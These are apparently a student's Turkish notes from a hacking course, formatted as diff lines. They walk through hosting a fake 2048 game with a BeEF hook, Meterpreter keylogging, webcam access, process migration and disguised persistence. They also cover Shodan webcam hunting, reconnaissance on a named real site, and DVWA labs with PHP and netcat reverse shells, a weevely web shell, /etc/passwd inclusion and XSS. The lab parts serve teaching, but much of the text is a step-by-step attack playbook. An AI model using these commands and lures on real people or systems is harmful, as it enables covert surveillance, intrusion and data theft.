+(bu linkteki şey bizim websitemize koyacağımız sahte oyundur) eğer kulandığımız git clone servisi yüklü değilse apt-get install git yazıp
+ yükleyebiliriz dosyamız cd 2048 diyoruz ardından ls yapıp hangi dosyalar var diye kontrol ediyoruz daha sonra 
+ mv dosya-ismi /var/www/html yazıp tek tek bütün dosya ve klasöleri bu dizine taşıyoruz komutu yazarken değişecek şey 
+ sadece dosya ismi olacak diğerleri aynen yazılması gerekiyor daha sonra cd .. yazıyoruz ve ls yaptığımızda bütün dosyalarımızın taşındığını
+  görüyoruz ardından do ip adresini açtığımız tarayıcıya gidip sayfayı yenilersek oyunumuzun buraya yüklendiğini görebiliriz
+
+bu dersimizde oyunu oynayan hedef kullanıcının beefimize hook olması için bir uygulama yapacağız
+oluşturduğumuz yeni ubuntu sunucumuzun içine beef i yükleyeceğiz https://github.com/beefproject/beef/wiki/Installation linkindeki 
+sudo apt-add-repository -y ppa:brightbox/ruby-ng komutunu ubuntunun açık olduğu terminale yapıştırıyoruz ve enterlıyoruz 
+bu komutla beef ruby programlama diliyle yazıldığı için ruby devoloper kit ini yüklememizi sağlıyor beef in düzgün çalışması için
+ sudo apt-get install git komutu ile ubuntumuza git i yüklüyoruz ardından sudo apt-get install curl komutuyla curl ü yüklememiz gerekiyor 
+ ubuntu ya curl internette POST-GET Request gibi web sunucularına bir istek yollarken kullandığımız bir araçtır 
+bir sunucudan bir veri indirmek için bir cevabın nasıl geleceğini görmek için kullandığımız bir araçtır 
+daha sonra \curl -sSL https://get.rvm.io | bash -s -- --autolibs=install-packages
+komutunu ubuntu terminaline yapıştırıp enterlıyoruz cd /usr/local/rvm/bin yazıyoruz sonra ./rvm requirements yazıp enterlıyoruz
+ sonra \curl -sSL https://get.rvm.io | bash -s stable --ruby
+komutunu yazıp enterlıyoruz daha sonra ./rvm install "ruby-2.5.3" diyip enterlıyoruz
+ şimdi ise beef in kendisini yükleyeceğiz cd /opt dizinine gidiyoruz 
+git clone https://github.com/beefproject/beef bu komutu yapıştırıp enterlıyoruz yükleme bittikten sonra cd beed diyip klasörümüze giriyoruz 
+daha sonra apt-get install ruby 
+diyip enterlıyoruz daha sonra Y yazıp enterlıyoruz daha sonra ./install komutunu çalıştırıyoruz    
+
+bağlantı koptuğu için digital oceandaki sunucumuza tekrar bir root@ip şeklinde bir ssh bağlantısı yapıyoruz
+ bağlandıktan sonra ca /opt/beef yapıyoruz nano config.yaml dosyasını açıyoruz ok tuşlarıyla aşağı iniyoruz ve 
+ credentials: kısmının altındaki user ksımını "atil123" passwd kısmını da "atil123" yapıyoruz 
+tekrar ok tuşuyla aşağı iniyoruz database: başlığının altında local host diye bir şey görürsek burada local host yazan yeri silip 
+do daki sunucunun ip adresini yazacağız biraz daha aşağı iniyoruz extension: başlığı altındaki metaploit satırındaki değeri 
+enable true yapıyoruz ardından ctrl+o yapıyoruz daha sonra ctrl+x yapıp kaydediyoruz ve dosyadan çıkıyoruz 
+daha sonra terminalde /opt/beef in içindeyken ./update-geoipdb komutunu çalıştırıp Y tuşuna basıyoruz ve bu komutla veritabanını güncelliyoruz
+ daha sonra ./update-beef i çalıştırarak beef i güncelliyoruz cd extensions yazıyoruz cd metasploit/ yazıyoruz ardından 
+ nano config.yaml komutunu çalıştırıyoruz nano ilk açıldığında en aşağıda host: satırına do daki sunucumuzun ip adresini yazıyoruz 
+ ve en alttaki komut olan callback_host satırına yine docean ip adresimizi yapıştırıyoruz ardından 
+ok tuşuyla yine aşağı iniyoruz ve {os: 'custom', path '/usr/share/metasploit-framework/'} satırındaki değeri bu şekilde değiştiriyoruz
+ ctrl+o yapıp kaydedip ctrl+x ile çıkıyoruz 
+/opt/beef dizinine geliyoruz ./beef komutunu çalıştırıyoruz işlem bittikten sonra yazırılan çıktıdaki ikinci UI Url adresini tarayıcımıza
+ yapıştırıp ardından beef kullanıcı adı ve şifremizi girdiğimizde beef açılmış olacak 
+
+bu dersimizde beef in bize vermiş olduğu hook.js i digital ocean daki sitemizin içine gömeceğiz bunun için önceki dersteki UI Url nin 
+hemen bir üst satırındaki Hook URL yi kopyalıyoruz  daha sonra web sitemizi editlememiz/değiştirmemiz gerekiyor  
+bu yüzden ssh bağlantımızla do daki sunucumuza bağlanıyoruz root@ip şeklinde daha sonra cd var/www/html yapıyoruz 
+nano index.html ile bu dosyayı açıyoruz en aşağıda <script> kısmında genellikle çalıştırılacak scriptler yer alır 
+iki defa space e basıyoruz aynı hizaya gelmesi için ardından <script src "bee-in-verdiği-hook-url" ></script> 
+(linkin etrafında tırnak işareti olması gerekiyor) ardından ctrl+o yapıp kaydedip ctrl+x ile çıkış yapıyoruz 
+ardından tercihen windows sanal makinemizde ama illa orası da olmak zorunda değil tarayıcımızın adres çubuğuna do ip adresimizi yapzıp
+ sitemize gidip oyunu başlatıyoruz ve beef UI sitemize girdiğimizde hedefimizin hook olduğunu görüyoruz daha sonra hedefimize amacımıza göre
+  beef saldırıları uygulayabiliriz 
+
+hackerlar genellikle içerisine zaafiyet meydana getirecek kodları enjekte ettikleri sitelerini bir domain alarak
+ hedeflerine göndermeye çalışırlar biz normal bir ev kullanıcıydak ip miz devamlı değişecektir modemi resetlediğimizde vs 
+ ancak önceki örneklerimizde olduğu gibi belirli bir ip adresinde bir port dinleme işlemi yapıyorsak statik bir ip ye ihtiyacımız olacaktır 
+ çünkü backdoorumuzda bizim ip adresimize bağlan diye bir seçenek giriyoruz ipmiz değiştiğinde de haliyle bağlanamayacak 
+ bunu yapmak için www.noip.com a kayıt oluyoruz bu sitenin yaptığı hizmet şu örneğin bir elektirik kesintisi modemi resetleme gibi 
+durumlarda değişen ip adresimizi tespit edip bize haber vererek önceki bağlantımızı yeni değişen ip adresimize yönlendirmemiz için
+ bize yardımcı olur açılan bölümden bir domain adı seçiyoruz örneğin free2048game.ddns.net daha sonra sağ altında bulunan 
+ Add Hostname butonuna basarak bu hostname i ekliyoruz daha sonra sitenin en solunda yer alan tablardan Dynamic DNS e tıklıyoruz
+  No İp Hostnames alt başlığına tıklıyoruz oluşturduğumuz hostname ismimize tıklıyoruz bize sol tarafta otomatik bir ip tanımlıyor 
+  burayı siliyoruz kendi digitalocean ile oluşturduğumuz web sitemizin ip sini giriyoruz ancak bunun aktif olması bir kaç saat sürebilir 
+telefonumuzla da bu siteye girdiğimizde de hook a takmış oluruz bu tarz saldırılara hedef olmamak için güvenilir olmayan https ile iletişim
+ sağlamayan ssl sertfikası bulunmayan herhangi bir siteden oyun oynamamalıyız veya js kodunu tetikleyecek herhangi bir işlem yapmamalıyız
+  ve güvenmediğimiz bir websitesine girdiğimizde sitenin source kodlarını inceleyebiliriz şüpheli bir durum mevcut mu diye 
+bu derste hedef cihazı hackledikten sonra meterpreter kullanımını öğreneceğiz 
+öncelikle terminale msfconsole > use exploit/mutlti/handler yazıyoruz ardından 
+show options > set PAYLOAD windows/meterpreter/reverse_http > shop options > set LHOST kali-ip-miz > exploit yazıp enterlıyoruz 
+
+ardından windows cihazımızda oluşturduğumuz .exe uzantılı dosyalardan birini çalıştırıp kali üzerinden bağlantımızı kuruyoruz 
+ardından sessions -l yazarak o cihazda halihazırda açık olan bütün oturumlarımızı görebiliriz 
+sessions -1 (-sessions numarası) yazdığımızda ilgili oturumu açmış oluruz 
+oturum arka planda çalışırken msfconsole da başka işlemler yapmak için background komutunu yazıyoruz / 
+sysinfo komutu ile de bağlandığımız cihazın sistem bilgilerini görüntüleyebiliriz başka bir komut olan help komutu ile de
+ aynı linuxdaki man gibi meterpreter de hangi komutları kullanabileceğimizi ve bu komutların ne işe yaradığını öğrenebileceğimiz bir 
+kılavuz sayfası açılır örneğin hedef cihazın webcam ini açmak istersek webcam_stream komutu ile bunu yapabiliriz 
+
+ps komutu hacklediğimiz cihazda o an halihazırda çalışmakta olan bütün işlemleri (proccess) bize gösterir windows da ctrl+al+del de
+ görev yöneticisinden çalışan işlemlere bakmakla aynı şey yazıdırılan işlemlerin içerisinde bizim payload.exe miz ve 
+ bu işlemin hangi dosya ve dosya yolu üzerinden başlatıldığı da yer alır hedefimiz eğer işlemleri incelerse
+bizim dosyamızı silip işlemi de yeniden başlatabileceği için bizim kendimizi proccess lerde gizlememiz gerekiyor bizim yapmak istediğimiz şey
+payload.exe işlemimizin sistemdeki diğer normal bir işlemin içerisinde gizleyerek çalıştırmak ve böylece görülmesini çok zor bir hale getirmek 
+bunu yapmak için hangi servisin veya işlemin içerisine gizlemek istiyorsak onun PID sini 
+(ps yazıldığında verilen çıktıdaki ilk sutunun altında yer alan sayısal değerlerden gizlemek istediğimiz işlemin olduğu kısımdaki değer) 
+yazmamız gerekiyor 
+bu işlemi migrate 2824 (explorer.exe işleminin pid si) yazıyoruz bu işleme ingilizce proccess migration (işlem göçü denir)
+
+bu dersimizde hedef cihazdaki önemli dosyaları meterpreter ile çalmayı öğreneceğiz (download yaparak) öncelikle bağlantıyı gerçekleştirdikten
+sonra bağlı olduğumuz sistemi genel olarak tanımak için sysinfo çalıştırabiliriz
+ ardından pwd ile istem içerisinde hangi konumdayız yoldayız bunu öğreniriz hedef cihazımızda download etmek istediğimiz dosyanın bulunduğu 
+yolda iken download dosya-ismi.uzantısı komutunu kullanarak ilgili dosyayı sistemimize indirebiliriz dosyayı mevcut kullanıcımızın 
+/home dizinine indirir upload komutunun kullanımını araştır (meterpreter de dosya yolu olarak mı veriliiyor vs vs)
+hedef cihaza msfconsole ile bağlandıktan sonra karşı tarafta bir keylogger çalıştırmak istersek keyscan_start komutunu çalıştırıyoruz
+ kaydedilen bilgileri okumak için de keyscan_dump komutunu kullanabiliriz hedef cihazda bir ekran görüntüsü almak için
+  screenshot komutunu çalıştırabiliriz yine mevcut kullanıcının /home dizinine kaydeder bu ekran görüntüsünü 
+hacklediğimiz hedef cihazdaki bağlantımızı sürdürebilir hale getirmek için öncelikle background yazıyoruz daha sonra
+ use exploit/windows/local/persistence yazıp enterlıyoruz 
+ardından show options yazıyoruz burada yapmak istediğimiz şey bizim backdoorummuzu/payloadımızı hedef cihaza servis olarak enjekte etmek
+ böylelikle hacklediğimiz kişi bilgisayarını her çalıştırdığında belli bir süre geçtikten sonra bize bağlansın ve biz hiç bir zaman bu
+  bağlantımızı kaybetmeyelim show options yazdıktan sonra gelen çıktıdaki DELAY (gecikme)
+özelliği de bu anlama geliyor cihaz başlatıldıktan sonra kaç saniye sonra bizimle bir bağlantı kurulsun onu ayarladığımız özellik delay in
+ altındaki EXE_NAME de payloadımızı enjekte ettiğimizde işlemin listesinde gözükecek ismidir -payloadımızın- set EXE_NAME winexplore.exe 
+ yazarak bunu ayarlayabiliriz PATH kısmını olduğu gibi bırakıyoruz SESSION kısmı önemli zaten show options yazdığımız zaman sütun başlıklarından hangi option un belirtilmesi kullanılması gerektiğini
+ Required sütünu altında yes/no olarak görebiliriz SESSION u ayarlamak için (hangi session u hacklemek istiyorsak) set SESSION 1 şeklinde 
+ belirtiyoruz son olarak sistem kendi oluşturacağı bir trojanı sisteme enjekte etmek yerine bizim oluşturduğumuzu enjekte etmesi için
+  -backdoor umuzu spesify- etmemiz gerekiyor show advanced yazıyoruz (gelişmiş özellikleri görütülemek için)
+burada EXE::Custom satırını değiştirmemiz gerekiyor set EXE::Custom /var/www/html/backdoors/kirk_newpayload.exe yazıp enterlıyoruz
+ son olarak exploit diyoruz ve belirlediğimiz bu payload ı sessions1 e enjekte etmiş olacağız 
+ardından windows makinemizi yeniden başlatıp kalide de use exploit/multi/handler/reverse_http yazıp > exploit dediğimizde cihaz açıldıktan
+ 10 saniye sonra bağlantımızın kurulduğunu göreceğiz
+exploit dedikten sonra yazdırılan bilgilerden Clean up meterpreter RC File satırındaki yolda bulunan dosyayı silersek baştan başltaıldığında 
+artık otomatik olarak bir access imiz olmayacaktır 
+
+bu bölümümüzde shodan nedir onu öğreneceğiz shodan, iot denilen (iot = internet of things / nesnelerin interneti) interneti kullanan
+ bir servis çalıştıran objelerin örneğin evimizde kullandığımız elektrik süpürgesi,buzdolabı,webcam olabilir bütün ip adreslerinin üstünde 
+ çalıştırdığı portları kategorize eden bir arama motorudur https://www.shodan.io/ sitesinden buraya ulaşabiliriz 
+
+IOT çeşitli haberleşme protokolleri sayesinde birbirleri ile haberleşen ve birbirine bağlanarak, bilgi paylaşarak akıllı bir ağ oluşturmuş
+ cihazlar sistemi olarak da tanımlanabilir shodan a girdikten sonra sol üstteki arama kısmına webcams yazarsak o an aktif olarak kullanılan
+  bütün webcamleri görebiliriz çıkan sonuçlardan birine tıklıyoruz sağ tarafta bu ip adresinin açık portları yer alıyor ip adresi ve portlar
+   üzerinden bu kameraya erişmeye çalışabiliriz tarayıcımızın ip adresine girmek istediğimiz webcam in ipadresi:açık-port şeklinde yazıp entera
+    basarsak giriş işlemini gerçekleştirmiş oluruz shodan ın arama kısmına vsat yazarak public olarak internete açık uyduları 
+da listeleyebiliriz eğer spesifik olarak örneğin 80 portu üzeirnden internete çıkan bir uydu sonucu almak istersek vsat por:80 yazıyoruz
+ (webcam için de webcam port:80 yazabiliriz) 2. portta ssh servisi çalışır örneğin spesifik olarak fransa da çalışrılan ssh servislerini görmek
+  için port:22 country:"FR" filtrelemesini kullanabiliriz spesifik olarak da paris şehrini aratmak istersek port:22 country:"FR" city:"Paris"
+   yazabiliriz 
+
+bu dersimizde shodanio ile içerisinde zaafiyet barındıran servisleri nasıl bulabileceğimizi öğreneceğiz 
+shodan da bir üyelik açtıktan sonra filtreleme özelliğini kullanarak içerisinde pek çok zaafiyet bulunduran bir işletim sistemi olan 
+windows xp yi spesifik olarak aratabiliriz bunun için arama kısmına os:"Windows XP" yazmamız yeterlidir.
+yine aynı şekilde shodan dan zaafiyet bulunduran vsftpd 2.3.4 veya apache 2.2.3 gibi sunucuları da aratabiliriz 
+ücretsiz versiyonunu kullandığımız için arama limitimiz olacaktır eğer bu limiti aşarsak ip mizi değiştirip aramamıza kaldığımız yerden 
+devam edebiliriz 
+
+bu dersimizde shodan ı kali linuxumuzda terminal üzerinden kullanmayı öğreneceğiz terminalimize pip install shodan yazıyoruz enterlıyoruz
+ eğer başarılı bir şekilde yüklenmezse apt-get update komutunu çalıştırdıktan sonra bu komutu çalıştırmayı deneyebiliriz 
+ ardından terminalimize shodan yazıp enterlıyoruz ardından shodan init shodan-hesabımızdaki-api-key 
+ini yapıştırıyoruz ardından enterlıyoruz [API key shodan a hesap açtığımızda karşımıza çıkan karekodun üstündeki koddur]
+shodan host(hosr yazıyordu) ip-adresi ile seçtiğimiz bir ip adresinin host bilgilerini terminale yazdıraibiliriz 
+örneğin shodan host 107.180.51.21 şeklinde sorgumuzu yapalım içinde hangi servislerin çalıştırıldığını görebiliriz 
+hangi portların açık olduğunu da görebiliriz ve hangi host şirketinde host edildiğini bize gösteriyor 
+
+websiteleri sunucu dediğimiz bilgisayarlarda saklanan veri yığınlarından ibarettir bu sunucular hem kişisel bilgisayarlarda kullandığımız gibi 
+işletim sistemindeki açıklardan faydalanılarak hem de kullanıcılara saldırarak ele geçirebilriz bu bölüm boyunca hem kali linux umuzu 
+kullanacağız hem de daha önceden yüklmiş olduğumuz metasploitable cihazımızı kullanacağız 
+metasploitable üzerinden herhangi bir websitesinde de bulunabilecek olan potansiyel açıkları öğrenip bunun hakkında bilgi sahibi olacağız 
+kali ve metasploitable ımızı nat network de çalıştırıyoruz  kullanıcı adı msfadmin şifre de msfadmin 
+
+bu derste bir siber saldırı yapılmadan önceki bilgi toplama aşamasını öğreneceğiz 
+bilgi toplama aşamasında maltego yu kullanacağız apt-get install maltegoce yazarak bu toolu indirebiliriz 
+yeni bir dosya/proje oluşturuyoruz soldaki kısımdan Website olan modülü seçip sağ alttaki website satırına travelersgifts.com yazıyoruz
+ ana sayfada oluşan web sitesinin yeşil ikonuna sağ tıklarsak bu site ile alakalı yapılabilecek işlemler gösterilir
+All Transforms u seçerek turuncu run ikonuna basıyoruz information gathering = bilgi toplama demek 
+
+https://www.netcraft.com/ bize araştırmak istediğimiz websitesi hakkında detaylı bilgiler sağlar bu bilgiler arasında sitenin alan adının
+ hangi şirket tarafından register edildiğini sitenin hangi programlama dilleri kullanılarak yazıldığını, 
+ sitenin siber saldırılara karşı olan risk seviyesini websitesinde hangi teknolojilerin kullanıldığı 
+
+https://www.yougetsignal.com/ bilgi toplama aşamasında kullanılan bu site de araştırdığımız sitenin ip adresini
+ başka bir websitesi de kullanıyor mu kullanıyorsa bu siteler ne onları öğrenmemizi sağlar bu bir sunucuda birden fazla web sitesi 
+ saklanabildiği/yayınlanabildiği anlamına gelir bu sitedeki reverse ip domain check inputuna www.travelersgifts.com adresini yazıyoruz 
+ burada domain üzerinden ip bulma işlemine değil web sitesinin ip sinden bu ip ye sahip başka web sitesi olup olmadığı araştırılıyor 
+ buna reverse ip search deniyor aynı ip ye sahip pek çok websitesi bulduk bu şu anlama gelebilir bu sonuçlardan birindeki ip adreslerine erişim 
+ sağlarsak sunucuya da erişim sağlayabileceğimizden hedefimizdeki websitesine de erişim sağlayabiliriz / hackleyebiliriz 
+bing.com a gidip search kısmına ip: hedefimizdeki-web-sitesinin-ipsini yazarsak yine getsignaldeki gibi o ip adresini kullanan
+ diğer websitelerini de görüntüleyebiliriz 
+
+bilgi toplamada kullanılan diğer bir sitemiz de https://archive.org/ bu web sitesinde istediğimiz bir websitesinin daha önceki bir halinin,
+ indexinin, tasarımının/görünümünün arşivlendiği bir sitedir 
+
+ICANN web sitelerinin domainlerini ip ye bağlama/eşleştirme konusunda yetkili bir uluslararası şirkettir 
+burada yine travelersgifts.com u aratabiliriz bize pek çok sonuç verecek 
+bu bilgiler iletişim bilgileri,bu websiteyi kim hangi şirkette register etmiş, domain ne zaman alınmış ve süresi ne zaman bitecek gibi
+ önemli tarihleri de görebiliriz
+ 
+ bu dersimizde robot.txt yi ve dirb frameworkünü öğreneceğiz  kali linuxa gidip terminalimie dirb yazıp enterlıyoruz 
+ daha sonra metasploitable makinemizi başlatıp kali de browser üzerinden 
+ mutillidae nin bulunduğu sayfaya gidiyoruz bu sayfanın urlsini kopyalıyoruz ardından kali terminaline dirb mutillidae-nin-urlsi ni yazıp 
+ enterlıyoruz dirb bizim için istediğimiz url de dirb in içinde kayıtlı olan web terminolojisinde sıkça kullanılan 
+ kulanıcı adı ve şifreleri hedef sitemiz içerisinde herhangi bir dosya içerisinde arar eğer dirb de kayıtlı olan ifadelerin bulunduğu içerikler
+  varsa dirb bunların bulunduğu url yi terminale bastırır + ile başlayan en son satırda robots.txt isimli bir url görüyoruz bunu alıp 
+  kalide browserımıza yapıştırıyoruz robots.txt dosyasının işlevi şudur crawler denilen websitelerinin bütün içeriklerini arama motorları
+   için indeksleyecek olan robotlara indekslenmesini istemediğimiz hassas bilgileri içeren dizin veya dosyaları belirttiğimiz bir txt dosyasıdır 
+bizim bu robot.txt de indekslenmesi istenilmeyen dosya yoluna sahip şeyleri bilmemizde fayda var çünkü bu robotların indekslenmesine
+ izin verilmeyen bu alanlar bizim web sitesini hacklememize yardımcı olabilir örneğin /passwords isimli bir dizin varmış 
+ mutillidaenin-urls/passwords şeklinde browserımıza yazıp enterlarsak karşımıza accounts.txt isimli bir dosya çıkacak 
+ bu dosyada bu sitedeki mevcut olan kullanıcılar ve bunların şifreleri yer alır 
+
+bu dersimizde hedef domainimizin altında bulunan subdomainleri bulmaya çalışacağız 
+Alt alan adı, bir ana alan adına bağlı olan alt alanlardır. Genellikle alan adının önüne getirilen nokta ile ayrılırlar.
+ Örneğin; wikipedia.org tr.wikipedia.org gibi subdomainleri biliyor olmak şu yüzden önemlidir örneğin hedefimizdeki websitesinin içerisinde
+  sunulan bir hizmet doğrudan o domaine değil de ana domaine bağlı olan bir alt domainde subdomainde bulunduruluyor olabilir 
+  böylece eğer biz bu subdomainde bir zaafiyet tespit edeiblirsek ve onu hacklersek hedefimizdeki ana domaini de hackleyebiliriz 
+https://github.com/TheRook/subbrute bu domainleri tespit etmek için subbrute isimli bir frameworkü kullanacağız kali terminalimize gelip 
+cd /opt yazıyoruz git clone https://github.com/TheRook/subbrute çalıştırıyoruz yüklendikten sonra cd subbrute/ 
+ardından python3 subbrute.py travelersgifts.com çalıştırıyoruz 
+(./subbrute.py de yapabiliriz/boşluktan sonra da subdomainlerini çıkarmak istediğimiz ana domaini yazıyoruz)
+
+kali ve metasploitable ı nat networkde açarak kali browserından ms nin ip sine gidiyoruz buradan dvwa i seçip security level ı low olarak
+ seçiyoruz dvwa e girdiğimizde sol tarafta web sitelerinde yaygın olarak görülen bazı açıkları pratik edebileceğimiz bölümler bulunur 
+buradaki seçeneklerden command execution a geliyoruz bir form (input gördük) bu formun amacı  buraya girilen ip adresini pinglemesidir 
+biz bu inputta başka bir komut çalıtırabiliyor muyuz bunu yapmaya çalışacağız örneğin ip miz 10.0.2.15 olsun 10.0.2.15;ls yaptığımızda 
+her iki komutun da çalıştığını görüyoruz Noktalı virgül (;) operatörü, önceki her bir komutun başarılı olup olmamasına bakılmaksızın,
+art arda birden çok komut yürütmenize izin verir.
+
+biz bu kod çalıştırma açığını kullanarak hedef cihazın terminalinde bir ters tcp bağlantıssı (reverse shell) kodu çalıştırıp terminale bizim 
+bilgisayarımıza bağlanması komutunu vereceğiz 
+
+öncelikle kalimizde terminalde msfconsole komutunu çalıştıralım çünkü eğer gönderidğimiz kod başarılı olursa bu bağlantıyı halihazırda
+ dinlemeye hazır bir halde olalım dinlemek için 2 yöntem öğreneceğiz birincisi diğer derslerden de aşina olduğumuz mutli handler yöntemi 
+ use exploit/multi/handler > set PAYLOAD windows/meterpreter/reverse_tcp > show options > set LHOST 10.0.2.15 
+ (kalinin local ip si) LPORT (4444 gözüküyorsa sorun değil istersek değiştirebiliriz ama biz böyle bırakacağız) çok önemli değil ama 
+ set LPORT 5050 yapıyoruz örnek olması için ardından exploit diyoruz ve bağlantımızı dinlemeye başlıyoruz 
+ardından kali browserımıza geliyoruz dvwa command execution formuna 10.0.2.15;php -r '$sock=fsockopen
+("bu kısma kalinin local ip adresini yazıyoruz",5050);exec("/bin/sh -i <&3 >&3 2>&3");' yazıyoruz 
+(reverse shell olarak bir php kodunu seçmemizin sebebi incection yaptığımız sitenin php ile yazılmış olmasından dolayıdır)
+php komutunun içinde kalinin ip adresini yazdıktan sonra 5050 yazmamızın sebebi dinlemiş olduğumuz port numarasının 5050 olmasıdır 
+
+submit e bastığımızda çalıştıramadık netcat i deneyebiliriz 
+
+browsera geliyoruz inputa 10.0.2.15;nc -e /bin/sh kali-ip-si 5050 yazıp submit diyoruz bu sefer bağlantı kuruldu ama hemen sonrasında 
+oturumumuz session umuz kapandı bu aşamada 2. yöntemimizi yani netcat toolunu kullanarak portu dinlemeyi deneyelim msfconsole dan çıkıyoruz 
+terminale nc -vv -l -p 5050 yazıp enterlıyoruz ardından ilk denememizde kullandığımız php kodunu inputa tekrar girip submit yapıyoruz 
+10.0.2.15;php -r '$sock=fsockopen("bu kısma kalinin local ip adresini yazıyoruz",5050);exec("/bin/sh -i <&3 >&3 2>&3");'
+biraz bekledikten sonra bağlantımızın başarıyla gerçekleştiğini görebilriz 
+
+bu dersimizde dosya yükleme açıklarını öğreneceğiz 
+kali browserından msploit e geliyoruz ardından dvwa e giriyoruz soldan upload kısmını sçeiyoruz burada örnek olması amacıyla 
+herhangi bir dosya yükleyebileceğimiz bir uygulama oluşturulmuş test etmek için herhangi bir jpg dosyasını buraya yüklüyoruz bize
+ ../../ /hackable/uploads/dosya-ismi.jpg succesfully uploaded çıktısını verdi yani resmimizi başarılı bir şekilde siteye yükledik
+  çıktının başındaki ../../ ifade şuan mevcut olarak bulunduğumuz file upload urlsinden / dizininden 2 dizin geride 
+  /hackable/uploads/dosya-ismi.jpg kısmına resmimizi yüklendiğini ifade ediyor 
+adres çubuğuna bu dizini yapıştırıp metasploitable-ın ip-si/dvwa/hackable/uploads/dosya-ismi.jpg adresine gidiyoruz ve yüklediğimiz
+ resim i görüyoruz yani gerçekten resmimizin yüklendiğini doğruladık bizim burada merak edeceğimiz husus ise buraya eğer bir image 
+ yani resim jpg vb dosyalar yükleyeibliyorsak acaba .php uzantılı bir php dosyası yükleyebilir miyiz 
+çünkü eğer yükleyebilirsek bu dosyanın içerisine az önceki örnekteki gibi bir reverse shell kodu yerleştirip hedef websitesinin temrinaline 
+ters bağlantı ile bağlanabiliriz 
+
+biz bu exploit içerecek olan php dosyamızı weevely isimli bir tool ile oluşturacağız kali terminaline weevely yazıyoruz ardından
+ weevely generate 123456 /root/myconneciton.php ardından enterlıyoruz ve 123456 şifresine sahip bu dizinde bu isimde bir backdoor dosyası 
+ oluşturmuş oluyoruz ardından kali broweserımızı açıp browse butonuna basıp oluşturduğumuz
+myconnection.php dosyasını seçip upload butonuna basıyoruz ve succesfully uploaded çıktısını aldık 
+
+tarayıcımızın  adres çubuğuna metasploitable-ın ip-si/dvwa/hackable/uploads/myconnection.php yazıp enterlıyoruz beyaz bir sayfa açıldı 
+ama hata almadık eğer myconenction.php dosyası sitede mevcut olmasaydı 404 hatası alacaktık demekki dosyamız yüklenmiş 
+
+bu uygulamamızda weevely frameworkünü kullanarak netcat veya msfconsole gibi bağlanmayı öğreneceğiz 
+weevely metasploitable-ın ip-si/dvwa/hackable/uploads/myconnection.php 123456 yazıp enterlıyoruz ve sessionumuzun açıldığını görüyoruz 
+ve artık bu siteyi ele geçirdiğimize göre istediğimiz komutları çalıştırabiliriz 
+
+bağlantı gerçekleştikten sonra fare ile scoll down yaptığımızda dosya indirme dosya yükleme vb pek çok işlemi hangi komutları kullanarak 
+yapabileceğimizi görebiliriz 
+
+
+bu dersimizde dosya barındırma açıklarını öğreneceğiz 
+
+dvwa > file inclusion kısmına giriyoruz file inclusion açığında bu sayfaya girdiğimizde url de ?page=include.php ifadesini görüyoruz 
+bu demektir ki sunucu kendi içerisinde barındırığı include.php dosyasını çalıştırarak bu url yi görüntülüyor acaba biz sunucuda (websitesinde)
+ potansiyel olarak mevcut olan diğer dosyaları çalıştırmaya çalışırsak hiç bir yetkimiz olmamasına rağmen bu dosyalara eşirim sağlayabilecek
+  miyiz dosya barındırma açığı bu anlama gelir 
+
+bunun için include.php dosyasının hangi dizinde bulundurulduğunu (yani sistemde nerede bulunduğunu) tahmin ederek bulmaya çalışarak yapabiliriz 
+bunun için /?page= (?page= kısmını silerek) /include.php olarak değiştiriyoruz mevcut url mizi ve ardından enterlıyoruz ve bir fatal error aldık
+ bu dosyanın 15. saıtında bir hata var diyor ama şunu öğrendik ki gerçekten sistemde bu isimde bir dosya mevcutmuş ve hatada da 
+ dosyanın bulunduğu tam dizini öğrenmeyi başardık in /var/www/dvwa/vulnerabilities/fi/include.php dosyamızın bulunduğu dizindir 
+
+ve bunu kopyalaıp ms-ip-si/dvwa/vulnerabilities/fi/?page=/var/www/dvwa/vulnerabilities/fi/include.php yazarak ilgili url ye gidiyoruz 
+hiç bir şey olmadı ama tablardan file include kısmını seçtiğimizde bu php dosyası dolaylı olarak sunucunun aracılığı ile çalıştırılırken 
+şimdi biz tam yolunu yazarak kendimiz bu dosyayı çalıştırmış olduk bunu url den de doğrulayabiliriz ilk açtığımızda url ile şimdiki url 
+çok farklı 
+
+peki biz dosyanın kendisinin bulunduğu dizine giderek dosyayı çalıştırdığımıza göre başka dizinleri de url kısmında açmaya çalışsak başarılı
+ olur muyuz örneğin 
+ms-ip-si/dvwa/vulnerabilities/fi/?page=/var/www/dvwa/vulnerabilities/fi adresine gitmeyi deniyoruz farkı hata mesajları aldık ama yine benzer
+ bir yapıda açıldı bu gibi tahminlerle çeşitli url leri deneyebiliriz veya hedefimizdeki websitesinin sunucunun işletim sistemi 
+ linux olduğu için linuxda mevcut olan dosyaları url de açmaya çalışabiliriz 
+
+örneğin ms-ip-si/dvwa/vulnerabilities/fi/?page=/etc/passwd url sine gidebiliriz gittiğimizde sunucudaki bu doayanın içeriklerinin browsera
+ bastırıldığını görebiliriz eğer bu url çalışmaz ise bir filtreleme olabilir dizinler araı geçişte bunu 
+ ms-ip-si/dvwa/vulnerabilities/fi/?page=/../../../../../etc/passwd diyerek mevcut url deki dizinlerden .. ile (cd .. ile aynı görevi görür)
+  root dizinine gidip oradan /etc/passwd e ulaşmayı deneyebiliriz 
+
+bu dersimizde xss nedir onu öğreneceğiz dvwa e giriyoruz (xss=cross site scripting demek) ve ilgili websitesinin input kısmında veya urlsinde
+ isteidğimiz javascript komutunu çalıştırabileceğimiz anlamına geliyor -js bir programlama dili- ancak bu kod genellikle 
+ sunucu tarafında değil de hedef son kullanıcının browserında (tarayıcısında) çalıştırılıyor 
+
+xss in pek çok türü vardır bu dersimizde reflected xss i öğreneceğiz bu tür url de bir parametre olarak sitede xss zaafiyetine sebep olacak bir
+ javascript kodunu yerleştirip bu url yi de hedef olarak seçtiğimiz birine attığımızda onun da linki açmasıyla aynı zaafiyetli durumla 
+ karşı karşıya kalmasını sağlamaktır dvwa ye giriyoruz kali browserından xss reflcted kısmına tıklıyoruz karşımıza çıkan uygulamada 
+ bizden bir name yani isim girmemizi istiyor ve girdiğimiz isim de url de ?name=james# şeklinde bir parametre ile oluşturuluyor 
+ isim girmemiz istenilen form a <script>alert("i hack you") </script> kodunu yapıştırıp submit e basıyoruz ve ekranda 
+bir alert mesajı içinde i hack you yazısının yazdırıldığını görüyoruz bu xss reflected açığının gerçekleştiği anlamına geliyor ardından url
+ deki adresin tamamını kopyalayıp eğer birine atarsak o da aynı alert mesajıyla karşılaşacaktır bu açığın tehlikesi olmasının sebebi 
+ alert haricinde daha tehlikeli kodlar da yazılıp bunların çalıştırılabilmesini sağlayabilmemizdir 
+
